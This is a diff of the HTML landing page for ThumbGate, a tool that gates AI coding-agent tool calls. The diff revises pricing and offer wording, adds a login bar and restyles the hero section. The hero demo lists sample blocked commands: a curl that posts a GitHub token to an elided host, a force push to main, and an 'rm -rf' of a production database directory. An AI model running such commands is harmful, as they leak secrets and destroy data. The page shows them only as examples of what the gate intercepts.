@@ -20,6 +20,29 @@
   <meta property="og:type" content="website">
   <meta property="og:url" content="__APP_ORIGIN__/">
   <script defer data-domain="thumbgate.ai" src="https://plausible.io/js/script.tagged-events.js"></script>
+  <script>
+    (function () {
+      var origRemoveChild = Node.prototype.removeChild;
+      Node.prototype.removeChild = function (child) {
+        if (child && child.parentNode !== this) return child;
+        return origRemoveChild.call(this, child);
+      };
+      var origInsertBefore = Node.prototype.insertBefore;
+      Node.prototype.insertBefore = function (newNode, refNode) {
+        if (refNode && refNode.parentNode !== this) return this.appendChild(newNode);
+        return origInsertBefore.call(this, newNode, refNode);
+      };
+      window.__THUMBGATE_TRUSTED_REFERRERS__ = ['thumbgate.ai', 'www.thumbgate.ai', 'checkout.stripe.com', 'github.com'];
+      window.isThumbGateTrustedReferrer = function (refStr) {
+        if (!refStr) return false;
+        try {
+          return window.__THUMBGATE_TRUSTED_REFERRERS__.indexOf(new URL(refStr).hostname) !== -1;
+        } catch (e) {
+          return false;
+        }
+      };
+    })();
+  </script>
   __GA_BOOTSTRAP__
   <script type="application/ld+json">
   {
@@ -47,8 +70,8 @@
       "Relevant lessons are re-ranked for the proposed action",
       "Repeated negative patterns can promote from warning to blocking gates",
       "Stale auto-promoted gates expire and stale lessons archive",
-      "Managed Enterprise Workflow Gate for one supported workflow",
-      "Local-first install with optional shared team enforcement"
+      "Setup Sprint for one supported local workflow",
+      "Local-first install. Hosted team features, SSO, and an org-wide audit log are not generally available."
     ]
   }
   </script>
@@ -90,8 +113,8 @@
   {
     "@context": "https://schema.org",
     "@type": "Service",
-    "name": "Enterprise Workflow Gate",
-    "description": "ThumbGate's $499 enterprise entry offer for one repeated AI-agent workflow failure, including a failure map, configured local gate, regression test, and rollout proof.",
+    "name": "Setup Sprint",
+    "description": "ThumbGate's $499 one-time setup for one repeated AI-agent workflow failure, including a failure map, configured local gate, regression test, and rollout proof. It is not an enterprise contract.",
     "provider": { "@type": "Organization", "name": "ThumbGate" },
     "offers": {
       "@type": "Offer",
@@ -128,7 +151,7 @@
         "name": "Is this the enterprise option?",
         "acceptedAnswer": {
           "@type": "Answer",
-          "text": "Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available."
+          "text": "No. The $499 Setup Sprint configures one supported workflow with you. Shared hosting, SSO, compliance packaging, an org-wide audit log, and multi-workflow rollout are not included and are not generally available."
         }
       },
       {
@@ -223,6 +246,7 @@
     }
     .nav-enterprise:hover { background: rgba(86, 227, 159, 0.14); color: var(--text) !important; }
     .offer-stack { display: grid; gap: 14px; }
+    #offers .offer-stack { grid-template-columns: repeat(2, minmax(0, 1fr)); align-items: start; }
     .pro-card {
       padding: 22px 24px;
       border: 1px solid rgba(56, 215, 255, 0.35);
@@ -270,6 +294,8 @@
       font: 750 12px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
     }
     .spec-chip strong { color: var(--cyan); font-weight: 850; }
+    a.spec-chip { color: #d7e6f3; text-decoration: none; }
+    a.spec-chip:hover { border-color: var(--cyan); }
     .proof-link { color: var(--cyan); font-weight: 750; text-decoration: none; }
     .proof-link:hover { text-decoration: underline; }
     .install-hint {
@@ -277,6 +303,7 @@
       color: var(--muted);
       font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace;
     }
+    #install { scroll-margin-top: 92px; }
     .install-hint code {
       color: var(--cyan);
       background: rgba(56, 215, 255, 0.08);
@@ -545,9 +572,10 @@
     .footer-links { display: flex; flex-wrap: wrap; gap: 18px; }
     .footer-links a { color: var(--muted); }
     @media (max-width: 840px) {
-      .nav-links > a:not(.nav-buy):not(.nav-enterprise) { display: none; }
+      .nav-links > a:not(.nav-buy):not(.nav-enterprise):not(.nav-auth-btn) { display: none; }
       .nav-links { gap: 10px; }
-      .hero-grid, .proof-grid { grid-template-columns: 1fr; }
+      .hero-grid, .proof-grid, #offers .offer-stack { grid-template-columns: 1fr; }
+      .compare { display: block; overflow-x: auto; }
       .loop, .deliverables { grid-template-columns: 1fr; }
       .loop-step:not(:last-child)::after { content: "↓"; top: auto; right: 50%; bottom: -28px; transform: translateX(50%); }
     }
@@ -567,22 +595,61 @@
       justify-content: flex-start;
       gap: 14px;
       margin: 0 0 18px;
-      font-size: clamp(42px, 6vw, 64px);
-      line-height: 1;
-      filter: drop-shadow(0 0 28px rgba(34, 211, 238, 0.28));
     }
-    .hero-thumbs span {
+    .hero-thumbs .up,
+    .hero-thumbs .down {
       display: inline-flex;
-      width: 1.15em;
-      height: 1.15em;
+      width: clamp(52px, 7vw, 72px);
+      height: clamp(52px, 7vw, 72px);
       align-items: center;
       justify-content: center;
+      padding: 12px;
       border-radius: 22%;
       background: rgba(17, 23, 34, 0.9);
       border: 1px solid rgba(39, 50, 70, 0.9);
+      color: #4ade80;
     }
     .hero-thumbs .up { border-color: rgba(86, 227, 159, 0.55); box-shadow: 0 0 0 1px rgba(86, 227, 159, 0.12); }
-    .hero-thumbs .down { border-color: rgba(255, 100, 124, 0.55); box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.12); }
+    .hero-thumbs .down {
+      border-color: rgba(255, 100, 124, 0.55);
+      box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.12);
+      color: #ff7a8c;
+      cursor: pointer;
+      font: inherit;
+    }
+    .hero-thumbs svg { width: 100%; height: 100%; display: block; }
+    .hero-thumbs .down svg { transform: rotate(180deg); }
+    .hero-thumbs button.down:focus-visible { outline: 2px solid #ff7a8c; outline-offset: 3px; }
+    .hero-thumbs button.down.is-lit { box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.45), 0 0 22px rgba(255, 100, 124, 0.35); }
+    .hero-gate-rows { display: flex; flex-direction: column; }
+    .hero-gate-row {
+      display: block;
+      width: 100%;
+      margin: 0;
+      padding: 6px 16px;
+      border: 0;
+      border-left: 2px solid transparent;
+      background: transparent;
+      color: #c8d2df;
+      font: 12.5px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace;
+      text-align: left;
+      white-space: pre-wrap;
+      cursor: pointer;
+    }
+    .hero-gate-row:first-child { padding-top: 14px; }
+    .hero-gate-row:last-child { padding-bottom: 14px; }
+    .hero-gate-row.is-selected { border-left-color: #38d7ff; background: rgba(56, 215, 255, 0.06); }
+    .hero-gate-row:focus-visible { outline: 1px solid #38d7ff; outline-offset: -2px; }
+    .hero-gate-row .deny { color: var(--red); font-weight: 800; }
+    .hero-gate-row .warn { color: #e6c07b; font-weight: 800; }
+    .hero-gate-note {
+      margin: 0;
+      padding: 0 16px 12px;
+      min-height: 0;
+      color: #9db0c4;
+      font: 12px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .hero-gate-note:empty { display: none; }
     .hero-visual {
       margin: 22px 0 0;
       border: 1px solid rgba(56, 215, 255, 0.22);
@@ -641,6 +708,11 @@
       background: rgba(17, 23, 34, 0.75);
       border: 1px solid rgba(39, 50, 70, 0.85);
     }
+    .compare { width: 100%; margin-top: 28px; border-collapse: collapse; font-size: 14px; }
+    .compare caption { caption-side: top; text-align: left; font-weight: 800; padding: 0 0 10px; color: var(--text); }
+    .compare th, .compare td { border-bottom: 1px solid var(--line); padding: 10px 12px; text-align: left; vertical-align: top; color: var(--muted); }
+    .compare th { color: var(--text); font-weight: 800; }
+    .hero-note { margin: 12px 0 0; color: var(--muted); font-size: 14px; line-height: 1.45; }
     .diagram-caption {
       margin: 14px 0 0;
       color: var(--muted);
@@ -661,10 +733,14 @@
     .self-improve-callout strong { color: var(--green); }
     .loop-step .thumb-icon {
       display: inline-flex;
+      gap: 6px;
       font-size: 28px;
       line-height: 1;
       margin-bottom: 4px;
     }
+    .loop-step .thumb-icon svg { width: 22px; height: 22px; }
+    .loop-step .thumb-icon .hero-thumb-up { color: #4ade80; }
+    .loop-step .thumb-icon .hero-thumb-down { color: #ff7a8c; transform: rotate(180deg); }
     .visual-pair {
       display: grid;
       grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
@@ -695,8 +771,42 @@
         <a href="#how-it-works">How it works</a>
         <a href="#offers">Pricing</a>
         <a href="#proof">Proof</a>
-        <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_nav&amp;utm_campaign=rally_style_gtm&amp;cta_id=nav_pro_buy&amp;cta_placement=nav&amp;plan_id=pro" data-offer-link data-cta-id="nav_pro_buy">Pro · $19/mo</a>
-        <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="nav_diagnostic_buy">Get Started · $499</a>
+        <a href="/cloud" data-cta-id="nav_cloud_dashboard" style="color:var(--cyan);font-weight:800;">Cloud Portal</a>
+        <a href="/deploy-plan" data-cta-id="nav_deploy_plan" style="color:var(--green);font-weight:800;">Deploy Plan</a>
+        <span id="homeSsoBadge" style="display:none;font:700 12px/1 ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--green);padding:5px 10px;border:1px solid rgba(86,227,159,0.35);border-radius:999px;background:rgba(86,227,159,0.08);"></span>
+        <button type="button" id="homeSsoSignUpBtn" class="nav-auth-btn" onclick="if(window.tgSetHomeAuthMode){window.tgSetHomeAuthMode('signup',true);}" style="display:inline-flex;align-items:center;min-height:38px;padding:8px 12px;border-radius:8px;border:1px solid var(--green);background:rgba(86,227,159,0.14);color:var(--green);font:800 13px/1 inherit;text-decoration:none;line-height:22px;cursor:pointer;">✨ Sign Up</button>
+        <button type="button" id="homeSsoSignInBtn" class="nav-auth-btn" onclick="if(window.tgSetHomeAuthMode){window.tgSetHomeAuthMode('login',true);}" style="display:inline-flex;align-items:center;min-height:38px;padding:8px 12px;border-radius:8px;border:1px solid var(--cyan);background:var(--cyan);color:#06121a;font:800 13px/1 inherit;text-decoration:none;line-height:22px;cursor:pointer;">🔐 Log In</button>
+        <button type="button" id="homeSsoLogoutBtn" class="nav-auth-btn" onclick="window.tgHomeLogout()" style="display:none;align-items:center;min-height:38px;padding:0 12px;border-radius:8px;border:1px solid rgba(255,107,107,0.5);background:rgba(255,107,107,0.1);color:#ff6b6b;font:800 13px/1 inherit;cursor:pointer;">Log Out</button>
+        <a class="nav-buy" href="#install" data-cta-id="nav_install_free">Install free</a>
+      </div>
+    </div>
+    <div id="homeSsoBar" style="display:none;border-top:1px solid var(--line);background:rgba(12,17,26,0.98);padding:12px 0;">
+      <div class="shell" style="display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;">
+        <div id="homeSsoLoginRow" style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;width:100%;justify-content:space-between;">
+          <span id="homeSsoPrompt" style="font-size:13px;font-weight:700;color:var(--text);"></span>
+          <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
+            <input type="email" id="homeSsoEmail" placeholder="work@company.com" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--cyan);background:#080b10;color:var(--text);font-size:13px;width:185px;" onkeydown="if(event.key==='Enter'){event.preventDefault();window.tgSubmitHomeAuth();}" />
+            <input type="password" id="homeSsoPassword" placeholder="Password or API key" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:#080b10;color:var(--text);font-size:13px;width:175px;" onkeydown="if(event.key==='Enter'){event.preventDefault();window.tgSubmitHomeAuth();}" />
+            <button type="button" id="homeSsoSubmitBtn" onclick="window.tgSubmitHomeAuth()" style="min-height:36px;padding:0 12px;border-radius:8px;border:0;background:var(--cyan);color:#041016;font:800 12px/1 inherit;cursor:pointer;">Log In</button>
+            <button type="button" id="homeSsoModeToggleBtn" onclick="window.tgToggleAuthMode()" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--green);background:rgba(86,227,159,0.12);color:var(--green);font:800 12px/1 inherit;cursor:pointer;">Sign Up</button>
+            <button type="button" onclick="window.tgHomeSsoLogin('google')" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:var(--panel);color:var(--text);font:700 12px/1 inherit;cursor:pointer;">Google</button>
+            <button type="button" onclick="window.tgHomeSsoLogin('github')" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:var(--panel);color:var(--text);font:700 12px/1 inherit;cursor:pointer;">GitHub</button>
+            <button type="button" onclick="window.tgToggleHomeSso(false)" aria-label="Close SSO sign-in bar" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:transparent;color:var(--muted);font:700 12px/1 inherit;cursor:pointer;">✕</button>
+          </div>
+        </div>
+        <div id="homeProjectsRow" style="display:none;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;width:100%;">
+          <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+            <span id="homeSsoSessionText" style="font:700 12px/1 ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--green);"></span>
+            <label for="homeProjectSelect" style="font-size:12px;color:var(--muted);font-weight:700;">Projects:</label>
+            <select id="homeProjectSelect" onchange="window.tgSwitchHomeProject(this.value)" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:#080b10;color:var(--text);font:700 12px/1 ui-monospace,SFMono-Regular,Menlo,monospace;"></select>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+            <input type="text" id="homeNewProjectInput" placeholder="New project (e.g. api-prod)" style="min-height:36px;padding:0 10px;border-radius:8px;border:1px solid var(--line);background:#080b10;color:var(--text);font:12px/1 ui-monospace,SFMono-Regular,Menlo,monospace;width:185px;" onkeydown="if(event.key==='Enter'){event.preventDefault();window.tgCreateHomeProject();}" />
+            <button type="button" onclick="window.tgCreateHomeProject()" style="min-height:36px;padding:0 12px;border-radius:8px;border:1px solid rgba(56,215,255,0.45);background:rgba(56,215,255,0.1);color:var(--cyan);font:800 12px/1 inherit;cursor:pointer;">+ Project</button>
+            <a id="homeOpenProjectLink" href="/dashboard" style="display:inline-flex;align-items:center;min-height:36px;padding:0 14px;border-radius:8px;background:var(--green);color:#06130d;font:800 12px/1 inherit;text-decoration:none;">Dashboard</a>
+            <button type="button" onclick="window.tgHomeLogout()" style="min-height:36px;padding:0 12px;border-radius:8px;border:1px solid rgba(255,107,107,0.5);background:transparent;color:#ff6b6b;font:700 12px/1 inherit;cursor:pointer;">Sign out</button>
+          </div>
+        </div>
       </div>
     </div>
   </nav>
@@ -707,44 +817,71 @@
       <div class="shell hero-grid">
         <div class="hero-copy">
           <div class="eyebrow">Pre-action firewall · &lt;0.5ms local · Not a prompt · Not a postmortem</div>
-          <div class="hero-thumbs" aria-hidden="true"><span class="up">👍</span><span class="down">👎</span></div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" style="position:absolute" aria-hidden="true">
+            <symbol id="thumb-glyph" viewBox="0 0 32 32">
+              <path d="M14.4 3.8c.6-1.4 2.6-1.4 3.1.1L19.2 8h4.2a2.2 2.2 0 0 1 2.2 2.5l-1.1 8.4a2.2 2.2 0 0 1-2.2 1.9H12.4a1.7 1.7 0 0 1-1.7-1.7V11.6c0-.9.8-1.7 1.7-1.7h2z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+              <path d="M10.7 10.8H8.4a1.7 1.7 0 0 0-1.7 1.7v7.4a1.7 1.7 0 0 0 1.7 1.7h2.3" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </symbol>
+          </svg>
+          <div class="hero-thumbs">
+            <span class="up" aria-hidden="true"><svg class="hero-thumb-up" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></span>
+            <button type="button" class="down" id="hero-thumb-down" aria-label="Record a thumbs-down for the selected command"><svg class="hero-thumb-down" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></button>
+          </div>
           <h1>Stop AI agent mistakes before they cost you.</h1>
-          <p class="hero-lede">Autonomous agents write, send, deploy, and install packages at inference speed — where breakout takes 27 seconds. Strip human-equivalent credentials and enforce hard allow/deny in <strong>&lt;0.5ms at the tool-call boundary</strong>, before execution.</p>
-          <div class="hero-terminal" aria-label="Live pre-action interception demo">
+          <p class="hero-lede">The rules learn from your thumbs and stay on your machine. A static hook does not. A detected secret is denied at the tool-call boundary.</p>
+          <div class="hero-terminal" id="hero-gate-demo" aria-label="Live pre-action interception demo">
             <div class="terminal-chrome" aria-hidden="true">
               <div class="dots"><span></span><span></span><span></span></div>
-              <span class="title">pretooluse · 0.4ms</span>
+              <span class="title">local gate</span>
               <span>local</span>
             </div>
-            <pre>curl -d "$GITHUB_TOKEN" https://...   → <span style="color:var(--red);font-weight:800">DENY</span> (secret leak)
-git push --force origin main          → <span style="color:var(--red);font-weight:800">DENY</span> (strict gate)
-rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);font-weight:800">DENY</span> (from 👎 rule)</pre>
+            <div class="hero-gate-rows" role="listbox" aria-label="Sample tool calls">
+              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret, every install)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="force">git push --force origin main          → <span class="warn">WARN</span> (deny only in strict mode)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (3 negatives, then strict mode)</button>
+            </div>
+            <p class="hero-gate-note" id="hero-gate-note" aria-live="polite"></p>
           </div>
-          <p class="install-hint"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button> · <a href="/pricing">Free vs. Pro →</a></p>
-          <p class="fit-line" style="margin-top:12px;"><strong>Pro at $19/mo</strong> or <strong>$499 Diagnostic</strong> on Claude Code, Cursor, Codex, or similar agents. Free local evaluate stays free.</p>
-            <span class="spec-chip"><strong>Capture</strong> feedback</span>
-            <span class="spec-chip"><strong>Rank</strong> lessons</span>
-            <span class="spec-chip"><strong>Promote</strong> gates</span>
-            <span class="spec-chip"><strong>Block</strong> next action</span>
+          <p class="install-hint" id="install"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button></p>
+          <nav class="spec-chips" aria-label="Install ThumbGate" style="margin-top:14px">
+            <a class="spec-chip" href="/install" title="npx thumbgate init --agent claude">Claude</a>
+            <a class="spec-chip" href="/install" title="npx thumbgate init --agent cursor">Cursor</a>
+            <a class="spec-chip" href="https://marketplace.visualstudio.com/items?itemName=igorganapolsky.thumbgate" rel="noopener" title="VS Code extension">VS Code</a>
+            <a class="spec-chip" href="/install" title="npx thumbgate init --agent codex">Codex</a>
+            <a class="spec-chip" href="/install#grok" title="grok mcp add thumbgate -- npx -y thumbgate mcp">Grok</a>
+            <a class="spec-chip" href="/install#hermes" title="npx --yes --package thumbgate thumbgate hermes-gate">Hermes</a>
+          </nav>
           </div>
           <figure class="hero-visual">
             <img src="/assets/diagrams/hero-thumbs.svg" width="640" height="360" alt="ThumbGate: thumbs up and thumbs down become a pre-action gate that can ALLOW, WARN, or DENY before the tool call runs" loading="eager" decoding="async">
           </figure>
-          <div class="trust-strip" aria-label="Verified engineering proof">
-            <span>7 CLIs · &lt;0.5ms p95 · Local SQLite</span>
-          </div>
-          <p class="install-hint" id="thumbgate-dashboard-command" style="margin-top:10px;">Dashboard: <code>npx thumbgate dashboard --open</code> · <code>/thumbgate-dashboard</code> · <code>thumbgate-dashboard</code> · <a href="/dashboard#insights">demo</a> · <a class="proof-link" href="#proof">strict-mode deny example ↓</a></p>
-        <div id="offers" class="offer-stack">
+        </div>
+    </section>
+
+    <section id="offers">
+      <div class="shell">
+        <div class="trust-strip" aria-label="Where the gate runs">
+          <span>7 CLIs · local gate</span>
+        </div>
+        <p class="install-hint">Claude Code, Cursor, Codex.</p>
+        <p class="install-hint" id="thumbgate-dashboard-command" style="margin-top:10px;">Dashboard: <code>npx thumbgate dashboard --open</code> · <code>/thumbgate-dashboard</code> · <code>thumbgate-dashboard</code> · <a href="/dashboard#insights">demo</a> · <a class="proof-link" href="#proof">strict-mode deny example ↓</a></p>
+        <div class="offer-stack">
           <aside class="pro-card" id="pro" aria-label="ThumbGate Pro subscription">
-            <div class="price"><strong>$19</strong><span>/mo · or $149/yr</span></div>
+            <div class="price"><strong>$19</strong><span>/mo · $149/yr</span></div>
             <h2>Pro</h2>
-            <p><strong>Self-serve for developers.</strong> Unlimited gates, visual debugger, recall, and DPO exports.</p>
-            <a class="button-pro" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_hero&amp;utm_campaign=rally_style_gtm&amp;cta_id=homepage_pro_buy&amp;cta_placement=hero&amp;plan_id=pro" data-offer-link data-cta-id="homepage_pro_buy" data-revenue-cta data-cta-placement="hero">Start Pro — $19/mo</a>
+            <p><strong>For one developer.</strong> Unlimited gates, visual debugger, and lessons from your thumbs.</p>
+            <a class="button-pro" href="/go/pro-direct?utm_source=website&amp;utm_medium=homepage_hero&amp;utm_campaign=rally_style_gtm&amp;cta_id=homepage_pro_buy&amp;cta_placement=offers&amp;plan_id=pro" data-offer-link data-cta-id="homepage_pro_buy" data-revenue-cta data-cta-placement="offers">Start Pro — $19/mo</a>
+            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;font-size:12.5px;">
+              <a href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_offers&amp;utm_campaign=pro_19&amp;cta_id=offers_pro_checkout&amp;cta_placement=offers&amp;plan_id=pro" data-offer-link data-revenue-cta data-cta-id="offers_pro_checkout" style="color:var(--text);font-weight:750;text-decoration:none;">Pro · $19/mo</a>
+              <a href="/go/bundle-49?utm_source=website&amp;utm_medium=homepage_offers&amp;utm_campaign=bundle_49&amp;cta_id=offers_bundle_49&amp;cta_placement=offers" data-offer-link data-revenue-cta data-cta-id="offers_bundle_49" style="color:var(--green);font-weight:750;text-decoration:none;">$49 Bundle</a>
+              <a href="/go/pro-annual?utm_source=website&amp;utm_medium=homepage_offers&amp;utm_campaign=pro_annual_149&amp;cta_id=offers_pro_annual_149&amp;cta_placement=offers" data-offer-link data-revenue-cta data-cta-id="offers_pro_annual_149" style="color:var(--cyan);font-weight:750;text-decoration:none;">$149/yr</a>
+              <a href="/go/playbook-999?utm_source=website&amp;utm_medium=homepage_offers&amp;utm_campaign=playbook_999&amp;cta_id=offers_playbook_999&amp;cta_placement=offers" data-offer-link data-revenue-cta data-cta-id="offers_playbook_999" style="color:var(--muted);font-weight:700;text-decoration:none;">$9.99 Playbook</a>
+            </div>
             <p class="checkout-note">Instant key · cancel anytime · free local evaluate stays free</p>
             <ul class="offer-points">
               <li>Unlimited gates + rule packs (Claude, Cursor, Git, AWS)</li>
-              <li>Visual gate debugger, dashboard &amp; multi-hop recall</li>
-              <li>1-click DPO &amp; HuggingFace exports from 👍/👎</li>
+              <li>See which check fired and which lesson matched</li>
+              <li>Export your thumbs as training data</li>
             </ul>
           </aside>
           <form id="buy" class="checkout-card" action="/go/diagnostic-pay" method="POST" data-primary-checkout style="border-color:rgba(0,110,82,.35);box-shadow:0 18px 50px rgba(0,110,82,.12);">
@@ -755,16 +892,16 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
             <input type="hidden" name="utm_campaign" value="rally_style_gtm">
             <input type="hidden" name="utm_content" value="hero_direct_checkout">
             <input type="hidden" name="cta_id" value="homepage_diagnostic_buy">
-            <input type="hidden" name="cta_placement" value="hero">
+            <input type="hidden" name="cta_placement" value="offers">
             <input type="hidden" name="plan_id" value="sprint_diagnostic">
             <input type="hidden" name="landing_path" value="/">
             <div class="price"><strong>$__SPRINT_DIAGNOSTIC_PRICE_DOLLARS__</strong><span>one time · done-with-you setup</span></div>
             <h2>Diagnostic Gate</h2>
-            <p><strong>Managed AI Agent Workflow Gate.</strong> Bring one failure; leave with a configured gate and regression test.</p>
+            <p><strong>Managed AI Agent Workflow Gate.</strong> One workflow, done with you. Not an enterprise contract.</p>
             <label for="buyer-email">Work email for receipt &amp; onboarding</label>
             <input id="buyer-email" type="email" name="customer_email" autocomplete="email" required placeholder="you@company.com">
-            <button class="button-primary" type="submit" data-revenue-cta data-cta-id="homepage_diagnostic_buy" data-cta-placement="hero">Get Started — $499 Diagnostic</button>
-            <p class="checkout-note">Prefer a call? <a href="/support" style="color:var(--cyan);font-weight:750;">Book a 15-min triage call →</a></p>
+            <button class="button-primary" type="submit" data-revenue-cta data-cta-id="homepage_diagnostic_buy" data-cta-placement="offers">Get Started — $499 Diagnostic</button>
+            <p class="checkout-note" style="margin-top:8px;"><a href="/go/diagnostic-direct?utm_source=website&amp;utm_medium=homepage_offers&amp;utm_campaign=sprint_diagnostic_499&amp;cta_id=offers_diagnostic_direct_499&amp;cta_placement=offers" data-offer-link data-revenue-cta data-cta-id="offers_diagnostic_direct_499" style="color:var(--green);font-weight:750;">$499 Stripe</a> · <a href="/support" style="color:var(--cyan);font-weight:750;">Call</a></p>
             <ul class="offer-points">
               <li>60-minute working review for one workflow</li>
               <li>One configured local gate and its regression test</li>
@@ -794,7 +931,7 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
       <div class="shell">
         <div class="section-kicker">Self-improving product loop</div>
         <h2 class="section-title">Pre-action checks—and the systems that refine them.</h2>
-        <p class="section-lede">Corrections become local lessons; repeated negatives become gates; the next action is checked before execution. <strong style="color:var(--text)">Click a step</strong> for the under-the-hood demo.</p>
+        <p class="section-lede">Corrections become local lessons; repeated negatives become gates; next actions are checked first. <strong style="color:var(--text)">Click a step</strong> for the demo.</p>
         <figure class="diagram-frame" style="margin-top:28px">
           <img src="/assets/diagrams/self-improving-thumbs-loop.svg" width="1100" height="420" alt="Self-improving ThumbGate loop: thumbs up or thumbs down become a local lesson, then a prevention rule, then ALLOW WARN or DENY on the next tool call. The loop closes under your control without retraining the model." loading="lazy" decoding="async">
         </figure>
@@ -807,7 +944,7 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
                auto-close <button> around <h3>/<div>, which broke click targets. -->
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-1" data-loop-step="1" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
             <span class="loop-number">1</span>
-            <div class="thumb-icon" aria-hidden="true">👍👎</div>
+            <div class="thumb-icon" aria-hidden="true"><svg class="hero-thumb-up" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg><svg class="hero-thumb-down" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></div>
             <h3>Capture feedback</h3>
             <p>Record explicit 👍 or 👎 with the action and outcome context.</p>
             <span class="loop-hint">Under the hood ↓</span>
@@ -816,7 +953,7 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
             <span class="loop-number">2</span>
             <div class="thumb-icon" aria-hidden="true">🧠</div>
             <h3>Remember locally</h3>
-            <p>Store a reviewable lesson that survives sessions without writing into model weights.</p>
+            <p>Store a reviewable lesson across sessions without changing model weights.</p>
             <span class="loop-hint">Under the hood ↓</span>
           </div>
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-3" data-loop-step="3" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
@@ -878,13 +1015,13 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
 
     <section id="deliverables">
       <div class="shell">
-        <div class="section-kicker">What the $499 enterprise gate buys</div>
+        <div class="section-kicker">What the $499 setup buys</div>
         <h2 class="section-title">A managed gate for one painful workflow.</h2>
-        <p class="section-lede">Enterprise entry for one workflow—not an org-wide platform license.</p>
+        <p class="section-lede">One workflow, done with you. SSO and a hosted audit log are not included.</p>
         <div class="deliverables">
           <article class="deliverable">
             <h3>Failure map</h3>
-            <p>The exact risky action, trigger, accountable owner, current safeguard, and missing proof.</p>
+            <p>Risky action, trigger, owner, safeguard, and missing proof.</p>
           </article>
           <article class="deliverable">
             <h3>Configured gate</h3>
@@ -892,7 +1029,7 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
           </article>
           <article class="deliverable">
             <h3>Regression and rollout proof</h3>
-            <p>The working test, rollout check, rollback boundary, and evidence receipt for the installed gate.</p>
+            <p>The test, how to undo the gate, and the receipt.</p>
           </article>
         </div>
         <div class="boundary"><strong>Boundary:</strong> the offer covers one supported local workflow. Multi-system implementation, legal or compliance certification, guaranteed savings, and hosted team features require separate scope. If the workflow cannot be reduced to one supported gate, the order is refunded instead of silently upsold.</div>
@@ -923,10 +1060,22 @@ next      decision recorded before execution</pre>
             </div>
           </div>
           <div class="proof-copy">
-            <p><strong>Why not a static hook?</strong> Prompts compact away; static bash hooks don’t learn from 👍/👎. Detected secret exfiltration and gate-process bypass attempts are denied by default (process-kill/environment-override self-disable floors). Matching destructive actions warn by default and deny in strict mode (managed strict-mode example—not a claim that every free install blocks every risky command automatically).</p>
+            <p><strong>Why not a static hook?</strong> Prompts compact away; static bash hooks don’t learn from 👍/👎. Detected secret exfiltration and gate-process bypass attempts are denied by default. Matching destructive actions warn by default and deny in strict mode. This is a managed strict-mode example, not a claim that every free install blocks every risky command automatically.</p>
             <a href="https://github.com/IgorGanapolsky/ThumbGate/blob/main/docs/VERIFICATION_EVIDENCE.md" target="_blank" rel="noopener">Read the test-backed verification evidence →</a>
-            <p style="margin-top:12px;"><a href="/whitepaper">White paper</a> · <a href="/eval-scorecard">Scorecard</a> · <a href="/architecture">Architecture</a> · <a href="/case-studies">Cases</a></p>
